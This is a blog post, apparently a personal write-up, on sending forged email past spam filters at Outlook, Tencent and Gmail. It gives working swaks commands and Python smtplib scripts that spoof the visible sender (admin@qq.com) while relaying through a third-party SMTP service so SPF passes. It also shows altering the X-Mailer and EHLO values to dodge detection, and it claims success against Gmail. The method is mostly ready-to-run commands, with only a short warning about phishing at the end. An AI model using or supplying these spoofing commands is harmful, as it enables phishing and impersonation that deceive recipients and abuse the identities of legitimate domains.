---
title: The Spam Filters Bypassing
date: 2019-12-04 20:27:17
categories: Social Engineering
tags: [Fake email]
keywords: [Fake email, Spam, Bypass, Email]
description: Here I described some methods used to bypass the spam filters. This kind of thing is much more difficult than before and I cannot guarantee these methods will work for every mailbox.
---

Due to some imperfections of the SMTP protocol, the email can be forged by malicious attackers. For example, the email sender and the email title can be modified to whatever they want. But some high-security mailboxes are able to identify the malicious email and tag it as junk email or spam. 

I'd like to use the swaks tool to forge the email. It provides many easy ways to modify elements of the email source. But I faced many problems when I tried to bypass the Outlook spam filter.

```shell
swaks --to xxx@live.com --from admin@qq.com --body body.txt
```

This email was detected as spam. If you take a look at the email source you will see that the SPF authentication was failed.

<img src="pic_11.png" width="60%" height="60%">

SPF is an email authentication protocol that allows the owner of a domain to specify which mail servers they use to send mail from that domain. SPF records list which IP addresses are authorized to send emails on behalf of their domains. You can find more details in this blog: https://blog.returnpath.com/how-to-explain-spf-in-plain-english/. In order to bypass the SPF auth, I used a third-party email-sending service named smtp2go. And there is something important to say, email messages contain two “from” addresses: the “envelope from” and the “header from”. This feature allows us to pass the SPF authentication by keeping the "envelope from" address.

```shell
swaks --to xxx@live.com --from xx@smtp2go.com --h-From: 'admin<admin@qq.com>'  --body body.txt --server mail.smtp2go.com -p 2525 -au xxx -ap xxx
```

But This email was tagged as junk email by Outlook. Let's take a look at the email source and we will see that the SPF authentication is passed. 

<img src="pic_12.png" width="60%" height="60%">

I searched the keyword "swaks" and saw the X-Mailer parameter is suspicious. 

<img src="pic_5.png" width="60%" height="60%">

I changed the value of the X-Mailer parameter and resent the email.

```shell
swaks --header-X-Mailer smtp2go.com --to xxx@live.com --from xx@smtp2go.com --h-From: 'admin<admin@qq.com>'  --body body.txt --server mail.smtp2go.com -p 2525 -au xxx -ap xxx
```

The email was also detected as junk email. When I browsed the email source I found the abbreviation for the reason that email being detected as spam.

<img src="pic_2.png" width="60%" height="60%">

<img src="pic_3.png" width="60%" height="60%">

More details: https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spam-message-headers

<img src="pic_4.png" width="60%" height="60%">

But I didn't find any description of that abbreviation. This problem has been discussed in this issue: https://github.com/MicrosoftDocs/OfficeDocs-o365seccomp/issues/211. The strange thing is this issue was closed without giving any answer. :)

I searched other features and I noticed that the helo authentication is kali. 

<img src="pic_6.png" width="60%" height="60%">

I added an argument to modify the helo authentication value. 

```shell
swaks --header-X-Mailer smtp2go.com --to xxx@live.com --from xx@smtp2go.com --h-From: 'admin<admin@qq.com>'  --body body.txt --ehlo qq.com --server mail.smtp2go.com -p 2525 -au xxx -ap xxx
```

<img src="pic_7.png" width="60%" height="60%">

The email will be detected as spam as well. I kept looking for the suspicious features and I found that the suffix of the *Message-Id* is *@kali*, maybe I can try to handle it in the further post.

<img src="pic_8.png" width="60%" height="60%">

Let's focus on the Tencent mailbox. I wrote a simple script to use the Tencent SMTP server to send the fake email automatically.

```python
# -*- coding: UTF-8 -*-

from email.mime.text import MIMEText
from email.header import Header
from smtplib import SMTP_SSL


host_server = 'smtp.qq.com'
sender_qq = '1234567'
pwd = 'xxx'
sender_qq_mail = '1234567@qq.com'
receiver = '1234567@qq.com'
mail_content = 'This is a test mail.'
mail_title = 'Test'

smtp = SMTP_SSL(host_server)
smtp.ehlo(host_server)
smtp.login(sender_qq, pwd)

msg = MIMEText(mail_content, "plain", 'utf-8')
msg["Subject"] = Header(mail_title, 'utf-8')
msg["From"] = Header("admin@qq.com", 'utf-8')
msg["To"] = receiver
smtp.sendmail(sender_qq_mail, receiver, msg.as_string())
smtp.quit()
```

But the email was rejected by the Tencent SMTP server directly. 

<img src="pic_10.png" width="60%" height="60%">

So I changed the SMTP server to smtp2go.com. The fake email was received successfully without being detected as spam, but the victim can notice the forwarding server in the email title.

<img src="pic_1.png" width="60%" height="60%">

I changed the target mailbox to Gmail and tested the *swaks* command and the python script.

```shell
swaks --header-X-Mailer smtp2go.com --to recursively.z@gmail.com --from xx@smtp2go.com --h-From: 'admin<admin@qq.com>'  --body body.txt --ehlo gmail.com --server mail.smtp2go.com -p 2525 -au xxx -ap xxx
```

```python
# -*- coding: UTF-8 -*-

import smtplib
from email.mime.text import MIMEText
from email.header import Header

mail_host="mail.smtp2go.com"
mail_user="xxx"
mail_pass="xxx"


sender = 'test@smtp2go.com'
receivers = ['recursively.z@gmail.com']

message = MIMEText('This is a test mail', 'plain', 'utf-8')
message['From'] = Header("admin@qq.com", 'utf-8')
message['To'] =  Header(receivers[0], 'utf-8')

subject = 'Test'
message['Subject'] = Header(subject, 'utf-8')


try:
    smtpObj = smtplib.SMTP()
    smtpObj.connect(mail_host, 2525)
    smtpObj.login(mail_user,mail_pass)
    smtpObj.sendmail(sender, receivers, message.as_string())
    print("Success")
except smtplib.SMTPException:
    print("Error")
```

The command and script can bypass the Gmail spam filter. And the forwarding server can be seen in the email title as I mentioned above.

<img src="pic_9.png" width="40%" height="40%">

For the methods discussed above, all of them cannot perform a perfect email attack. But if you are not careful enough, you will be hacked through social engineering phishing.
